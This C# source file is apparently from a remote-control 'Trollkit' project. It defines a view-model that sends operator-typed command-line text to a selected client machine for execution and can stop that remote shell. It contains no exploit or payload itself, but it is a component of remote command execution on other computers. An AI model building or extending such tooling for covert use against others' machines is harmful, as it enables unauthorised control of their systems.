using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;

namespace Trollkit_Library.ViewModels.Commands
{
	public class CMDCommands
	{
		private readonly Server _server;
		private readonly string handler;

		public ICommand SendCMD { get { return new SendServerCommand(SendCMDToClient); } }
		public ICommand Close { get { return new SendServerCommand(CloseCMD); } }
		public ICommand Focus { get { return new SendServerCommand(FocusOnTextBox); } }

		private string _CommandText;
		public string CommandText { get { return _CommandText; } set { _CommandText = value; _server.UpdateProperty("CMD"); } }

		public bool IsFocusedElement { get; set; }

		public CMDCommands(Server server, string handler)
		{
			_server = server;
			this.handler = handler;

			CommandText = "";
		}

		public void SendCMDToClient()
		{
			
			TransferCommandObject returnObject = new TransferCommandObject { Command = "ExecuteCMD", Handler = handler, Value = CommandText };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
			CommandText = "";
		}


		public void CloseCMD()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "StopCMD", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		public void FocusOnTextBox()
        {
			IsFocusedElement = true;
			_server.UpdateProperty("CMD");
        }
	}
}
